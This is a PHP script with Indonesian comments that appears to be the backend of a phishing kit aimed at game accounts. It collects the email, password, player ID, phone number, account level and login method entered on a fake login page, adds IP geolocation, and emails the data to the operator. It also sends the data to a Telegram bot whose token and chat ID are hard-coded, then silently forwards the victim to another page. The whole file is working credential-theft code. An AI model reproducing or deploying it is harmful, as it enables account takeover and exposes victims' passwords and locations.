<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$user = new get_flag();
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$playid = $user->post($_POST['playid']);
$phone = $user->post($_POST['phone']);
$level = $user->post($_POST['level']);
$login = $user->post($_POST['login']);



// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "$flag | $callcode_ip | PUNYA SI $email | LEVEL $level | LOGIN $login";
$pesan = '
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px; border-top-left-radius: 5px; border-top-right-radius: 5px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: transparent" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: transparent" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>'.$continent_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$country_ip.' / '.$country_cd.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CALLING CODE</th>
<th style="width: 78%; text-align: center;"><b>'.$callcode_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$region_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$city_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$lat_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$lon_ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$ipaddress.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIME ZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$zone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$user->mail($emailku, $subjek, $pesan, $headers);
$token="1891320637:AAGUeXURaAMYanmwxL10L8aKPtfVE4CR33w";
$chatId="1190183001";
$text="email: $email pass :$pass login: $login ip: $ipaddress country: $country_cd number: $phone level: $level Playid: $playid";
$url = "https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$chatId&text=$text";
file_get_contents($url);
// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='arpantek' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
?>